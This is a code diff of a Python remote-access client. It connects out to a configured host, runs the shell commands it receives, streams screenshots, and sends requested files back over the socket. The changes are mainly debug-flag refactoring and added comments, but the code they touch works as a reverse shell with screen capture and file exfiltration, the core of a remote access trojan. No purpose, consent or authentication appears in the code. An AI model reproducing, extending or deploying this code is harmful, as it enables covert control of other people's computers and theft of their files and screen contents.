@@ -111,14 +111,14 @@ def checkIfAvailableInDirectory(currentDir: str, cmd: str, offset: int) -> bool:
 # Main server function
 def mainServer(HOST, PORT, debug: bool = False):
     # Create the server-client socket
-    clientSocket = connectSocket(HOST, PORT, True)
+    clientSocket = connectSocket(HOST, PORT, debug)
 
     command = b""
     startedVideoShare = False
     currentDirectory = getCurrentDirectory()
 
     while True:
-        typeOfRequest, command = recvPackets(clientSocket, True)
+        typeOfRequest, command = recvPackets(clientSocket, debug)
         try:
             command: str = command.decode()
         except:
@@ -132,7 +132,7 @@ def mainServer(HOST, PORT, debug: bool = False):
             sys.exit(0)
         if command == "EXIT0x02":
             startedVideoShare = False
-            clientSocket = connectSocket(HOST, PORT, True)      
+            clientSocket = connectSocket(HOST, PORT, debug)      
 
         # If the request is a string request (0x63 is "c" in ascii, it stands for char)
         if typeOfRequest == 0x63:
@@ -151,11 +151,11 @@ def mainServer(HOST, PORT, debug: bool = False):
             
             # If the commmand has no output
             if output.stdout == b"":
-                sendPackets(clientSocket, currentDirectory.encode() + b">", 99, True)
+                sendPackets(clientSocket, currentDirectory.encode() + b">", 99, debug)
             else:
                 print(command)
                 finalOutput = output.stdout + "\n".encode() + currentDirectory.encode() + b">"
-                sendPackets(clientSocket, finalOutput, 99, True)
+                sendPackets(clientSocket, finalOutput, 99, debug)
 
             # DEBUG
             if debug and not output.stdout == "":
@@ -171,12 +171,12 @@ def mainServer(HOST, PORT, debug: bool = False):
                 frameBytes = io.BytesIO()
                 frame.save(frameBytes, format="PNG") # Convert it to a png file
                 screenBuffer = frameBytes.getvalue()
-                sendPackets(clientSocket, screenBuffer, 0x76, False) # Send the data through the network
+                sendPackets(clientSocket, screenBuffer, 0x76, debug) # Send the data through the network
 
             # If the video request if a video stop request
             if "stop" in command:
                 startedVideoShare = False
-                sendPackets(clientSocket, b"Video stream stopped!", 0x63, True)
+                sendPackets(clientSocket, b"Video stream stopped!", 0x63, debug)
                 continue
             
             # If the video request is a video continue command
@@ -185,21 +185,23 @@ def mainServer(HOST, PORT, debug: bool = False):
                 frameBytes = io.BytesIO()
                 frame.save(frameBytes, format="PNG")
                 screenBuffer = frameBytes.getvalue()
-                sendPackets(clientSocket, screenBuffer, 0x76, False)
+                sendPackets(clientSocket, screenBuffer, 0x76, debug)
         
+        # If the request if a file request
         if typeOfRequest == 0x66:
+
+            # If the file request is a "getfile" request
             if "getfile" in command:
-                filePath = currentDirectory + "\\" + command[8:]
-                fileName = command[8:]
-                if checkIfAvailableInDirectory(currentDirectory, fileName, 0):
-                    if os.path.getsize(filePath) < 2000000000:
+                filePath = currentDirectory + "\\" + command[8:] # Construct the file path
+                if checkIfAvailableInDirectory(currentDirectory, command, 8): # Check if the file is available in the currentDirectory
+                    if os.path.getsize(filePath) < 2000000000: # Check if its bigger than 2GB
+                        # Read and send the file data
                         with open(filePath, "rb") as reader:
                             fileData = reader.read()
-                            sendPackets(clientSocket, fileData, 0x66, True)
-                            sendPackets(clientSocket, fileName.encode(), 0x66, True)
+                            sendPackets(clientSocket, fileData, 0x66, debug)
                 else:
-                    errorMessage = b"EE" + b"No file with name " + fileName.encode() + b" in " + currentDirectory.encode() + b"\n" + currentDirectory.encode() + b">"
-                    sendPackets(clientSocket, errorMessage, 0x63, True)
+                    errorMessage = b"EE" + b"No file with name " + command[8:].encode() + b" in " + currentDirectory.encode() + b"\n" + currentDirectory.encode() + b">"
+                    sendPackets(clientSocket, errorMessage, 0x63, debug)
                      
 
 
